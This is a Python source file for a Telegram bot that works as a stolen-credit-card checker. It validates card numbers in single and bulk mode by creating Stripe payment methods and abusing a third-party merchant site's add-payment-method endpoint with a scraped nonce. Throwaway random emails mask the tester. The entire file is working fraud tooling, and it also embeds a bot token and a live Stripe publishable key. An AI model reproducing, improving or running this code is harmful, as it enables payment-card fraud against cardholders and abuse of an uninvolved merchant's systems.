import telebot
import threading
import requests
import random
import string
import time
import re
from telebot.types import Message

ADMIN_ID = 6652287427
approved_users = set([ADMIN_ID])

bot = telebot.TeleBot('6788669053:AAHHry0sAOx9rkF0lklZUJrMsAnFjvc1EGs')
stop_checking = set()

def is_approved(user_id):
    return user_id in approved_users

@bot.message_handler(commands=['approve'])
def approve_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "❌ You are not authorized to approve users.")
    try:
        user_id = int(message.text.split()[1])
        approved_users.add(user_id)
        bot.reply_to(message, f"✅ User {user_id} approved successfully.")
    except:
        bot.reply_to(message, "❌ Invalid format. Use /approve <user_id>")

def random_email(length=9):
    domain = "gmail.com"
    user = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return f"{user}@{domain}"

def create_session():
    try:
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0'}
        session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        return session
    except:
        return None

def check_stripe(cc, session):
    try:
        cc_num, mm, yy, cvv = cc.split('|')
        if '20' in yy:
            yy = yy.split('20')[1]
        email = random_email()

        data = {
            'type': 'card',
            'card[number]': cc_num,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvv,
            'billing_details[email]': email,
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
        r = session.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers, timeout=20)
        res = r.json()

        if 'error' in res:
            return res['error']['message']

        pm_id = res.get('id')
        if not pm_id:
            return "Payment Method ID not found"

        nonce_req = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)', nonce_req.text)
        if not nonce_match:
            return "Nonce not found"
        nonce = nonce_match.group(1)

        intent_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce
        }
        intent_headers = headers.copy()
        intent_headers.update({
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/'
        })
        response = session.post(
            'https://www.thetravelinstitute.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
            headers=intent_headers,
            data=intent_data,
            timeout=20
        )
        json_response = response.json()
        if not json_response.get('success'):
            return json_response.get('data', {}).get('error', {}).get('message', 'Declined')

        return "Approved"
    except Exception as e:
        return f"Error: {str(e)}"

@bot.message_handler(commands=['start'])
def handle_start(message: Message):
    user = message.from_user
    if not is_approved(user.id):
        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes")
    bot.reply_to(message, f"""
𝗛𝗲𝗹𝗹𝗼, {user.first_name} 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗧𝗵𝗲 𝗕𝗼𝘁

𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
/chk - 𝗧𝗼 𝗖𝗵𝗲𝗰𝗸 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱
/txt - 𝗧𝗼 𝗖𝗵𝗲𝗰𝗸 𝗠𝗮𝘀𝘀 𝗖𝗮𝗿𝗱𝘀

Stripe Charge 5$

Bᴏᴛ Bʏ @Newlester""", parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def handle_stop(message: Message):
    if not is_approved(message.from_user.id):
        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes.")
    stop_checking.add(message.from_user.id)
    bot.send_message(message.chat.id, "✅ Stopping mass card checking...")

@bot.message_handler(commands=['chk'])
def handle_chk(message: Message):
    if not is_approved(message.from_user.id):
        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes")
    args = message.text.split(' ', 1)
    if len(args) != 2:
        return bot.reply_to(message, '❌ Invalid format. Use: /chk <cc|mm|yy|cvv>')
    cc = args[1].strip()

    def run():
        session = create_session()
        if not session:
            return bot.send_message(message.chat.id, "❌ Failed to create session")

        loading_msg = bot.send_message(message.chat.id, "⏳ Please wait while we check your card...", parse_mode='Markdown')
        animation = ['`Checking 🔄`', '`Checking 🔁`', '`Checking 🔃`'] * 2
        for frame in animation:
            time.sleep(0.4)
            bot.edit_message_text(chat_id=message.chat.id, message_id=loading_msg.message_id, text=frame, parse_mode='Markdown')

        result = check_stripe(cc, session)
        status = "Approved ✅" if "Approved" in result else "Declined ❌"
        message_text = (
            f"𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸 | /chk\n\n"
            f"𝗖𝗮𝗿𝗱 : `{cc}`\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {result}\n"
            f"𝗦𝘁𝗮𝘁𝘂𝘀 - {status}"
        )
        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_msg.message_id, text=message_text, parse_mode='Markdown')

    threading.Thread(target=run).start()

@bot.message_handler(commands=['txt'])
def handle_txt(message: Message):
    if not is_approved(message.from_user.id):
        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes")
    doc = message.document or (message.reply_to_message.document if message.reply_to_message else None)
    if not doc:
        return bot.reply_to(message, "❌ Please send or reply to a .txt file using /txt")

    file_info = bot.get_file(doc.file_id)
    content = bot.download_file(file_info.file_path).decode('utf-8')
    cards = [line.strip() for line in content.splitlines() if line.strip()]
    bot.send_message(message.chat.id, f"📥 {len(cards)} cards loaded. Checking...")

    def run():
        session = create_session()
        if not session:
            return bot.send_message(message.chat.id, "❌ Failed to create session")

        hit, dead = 0, 0
        total = len(cards)
        user_id = message.from_user.id

        progress_msg = bot.send_message(
            message.chat.id,
            f"𝗠𝗮𝘀𝘀 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 | /txt\n\n"
            f"Tᴏᴛᴀʟ » {total}\n"
            f"Aᴘᴘʀᴏᴠᴇᴅ » 0\n"
            f"Dᴇᴄʟɪɴᴇᴅ » 0\n"
            f"Rᴇ𝘀𝗽𝗼𝗻𝘀𝗲 » Starting check...\n"
            f"Cᴀʀᴅs Lᴇғᴛ » {total}",
            parse_mode='Markdown'
        )
        msg_id = progress_msg.message_id

        for idx, cc in enumerate(cards, 1):
            if user_id in stop_checking:
                stop_checking.remove(user_id)
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg_id,
                    text="⛔ Mass card checking stopped by user.",
                    parse_mode='Markdown'
                )
                return

            res = check_stripe(cc, session)

            if 'Approved' in res:
                hit += 1
                bot.send_message(
                    message.chat.id,
                    f"𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗖𝗮𝗿𝗱 𝗙𝗼𝘂𝗻𝗱\n𝗖𝗮𝗿𝗱 - `{cc}`\n𝗦𝘁𝗮𝘁𝘂𝘀 - 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱",
                    parse_mode='Markdown'
                )
            else:
                dead += 1

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_id,
                text=(
                    f"𝗠𝗮𝘀𝘀 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 | /txt\n\n"
                    f"Tᴏᴛᴀʟ » {total}\n"
                    f"Aᴘᴘʀᴏᴠᴇᴅ » {hit}\n"
                    f"Dᴇᴄʟɪɴᴇᴅ » {dead}\n"
                    f"Rᴇ𝘀𝗽𝗼𝗻𝘀𝗲 » {res}\n"
                    f"Cᴀʀᴅs Lᴇғᴛ » {total - idx}"
                ),
                parse_mode='Markdown'
            )

    threading.Thread(target=run).start()

bot.polling(none_stop=True)